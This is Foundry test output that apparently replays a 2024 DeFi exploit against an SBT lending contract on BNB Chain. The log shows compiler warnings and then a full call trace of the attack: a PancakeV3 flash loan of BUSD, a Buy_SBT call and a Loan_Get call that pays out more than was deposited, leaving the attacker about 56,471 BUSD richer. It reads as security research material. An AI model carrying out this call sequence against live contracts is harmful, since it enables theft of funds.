Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.32s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-07/SBT_exp.sol:22:5:
   |
22 |     Uni_Pair_V3 Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2123:1:
     |
2123 | interface Pool {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 383.96ms (284.81µs CPU time)

Ran 1 test for src/test/2024-07/SBT_exp.sol:ContractTest
[PASS] testExploit() (gas: 393794)
Logs:
  Attacker BUSD balance before attack: 1.000000000000000000
  Attacker BUSD balance after attack: 56471.209679886340000000

Traces:
  [396594] ContractTest::testExploit()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance before attack", val: 1000000000000000000 [1e18], decimals: 18)
    ├─ [377982] 0x36696169C63e42cd08ce11f5deeBbCeBae652050::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1950000000000000000000000 [1.95e24], 0, 0x3078313233)
    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x36696169C63e42cd08ce11f5deeBbCeBae652050) [staticcall]
    │   │   └─ ← [Return] 36133491513892207520461026 [3.613e25]
    │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x36696169C63e42cd08ce11f5deeBbCeBae652050) [staticcall]
    │   │   └─ ← [Return] 24757939605718713724968 [2.475e22]
    │   ├─ [8871] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1950000000000000000000000 [1.95e24])
    │   │   ├─ emit Transfer(from: 0x36696169C63e42cd08ce11f5deeBbCeBae652050, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1950000000000000000000000 [1.95e24])
    │   │   └─ ← [Return] true
    │   ├─ [333212] ContractTest::pancakeV3FlashCallback(975000000000000000000 [9.75e20], 0, 0x3078313233)
    │   │   ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x2b45DD1d909c01aAd96fa6b67108D691B432f351, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x2b45DD1d909c01aAd96fa6b67108D691B432f351, 950000000000000000000000 [9.5e23])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, value: 950000000000000000000000 [9.5e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [24620] 0x94441698165fB7e132e207800B3eA57E34c93a72::approve(0x2b45DD1d909c01aAd96fa6b67108D691B432f351, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [28498] 0x2b45DD1d909c01aAd96fa6b67108D691B432f351::_Start()
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x2b45DD1d909c01aAd96fa6b67108D691B432f351) [staticcall]
    │   │   │   │   └─ ← [Return] 1007455165109033599609515 [1.007e24]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [66767] 0x2b45DD1d909c01aAd96fa6b67108D691B432f351::Buy_SBT(20000000 [2e7])
    │   │   │   ├─ [2607] 0x94441698165fB7e132e207800B3eA57E34c93a72::balanceOf(0x2b45DD1d909c01aAd96fa6b67108D691B432f351) [staticcall]
    │   │   │   │   └─ ← [Return] 20999916430830343150012642 [2.099e25]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x2b45DD1d909c01aAd96fa6b67108D691B432f351) [staticcall]
    │   │   │   │   └─ ← [Return] 1007455165109033599609515 [1.007e24]
    │   │   │   ├─ [6034] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, 959484790320113660000000 [9.594e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, value: 959484790320113660000000 [9.594e23])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, value: 115792089237316195423570985008687907853269984665640563079972793687799469639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [27937] 0x94441698165fB7e132e207800B3eA57E34c93a72::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20000000000000000000000000 [2e25])
    │   │   │   │   ├─ emit Transfer(from: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20000000000000000000000000 [2e25])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [163628] 0x2b45DD1d909c01aAd96fa6b67108D691B432f351::Loan_Get(1966930 [1.966e6])
    │   │   │   ├─ [607] 0x94441698165fB7e132e207800B3eA57E34c93a72::balanceOf(0x2b45DD1d909c01aAd96fa6b67108D691B432f351) [staticcall]
    │   │   │   │   └─ ← [Return] 999916430830343150012642 [9.999e23]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x2b45DD1d909c01aAd96fa6b67108D691B432f351) [staticcall]
    │   │   │   │   └─ ← [Return] 1966939955429147259609515 [1.966e24]
    │   │   │   ├─ [607] 0x94441698165fB7e132e207800B3eA57E34c93a72::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 20000000000000000000000000 [2e25]
    │   │   │   ├─ [5850] 0x94441698165fB7e132e207800B3eA57E34c93a72::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, 1299884000000000000000000 [1.299e24])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, value: 1299884000000000000000000 [1.299e24])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, value: 115792089237316195423570985008687907853269984665640562739573584007913129639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1966930000000000000000000 [1.966e24])
    │   │   │   │   ├─ emit Transfer(from: 0x2b45DD1d909c01aAd96fa6b67108D691B432f351, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1966930000000000000000000 [1.966e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x36696169C63e42cd08ce11f5deeBbCeBae652050, 1950975000000000000000000 [1.95e24])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x36696169C63e42cd08ce11f5deeBbCeBae652050, value: 1950975000000000000000000 [1.95e24])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x36696169C63e42cd08ce11f5deeBbCeBae652050) [staticcall]
    │   │   └─ ← [Return] 36134466513892207520461026 [3.613e25]
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x36696169C63e42cd08ce11f5deeBbCeBae652050) [staticcall]
    │   │   └─ ← [Return] 24757939605718713724968 [2.475e22]
    │   ├─ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 1950000000000000000000000 [1.95e24], param3: 0, param4: 975000000000000000000 [9.75e20], param5: 0)
    │   └─ ← [Stop] 
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 56471209679886340000000 [5.647e22]
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance after attack", val: 56471209679886340000000 [5.647e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.81s (2.80s CPU time)

Ran 2 test suites in 3.81s (4.19s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
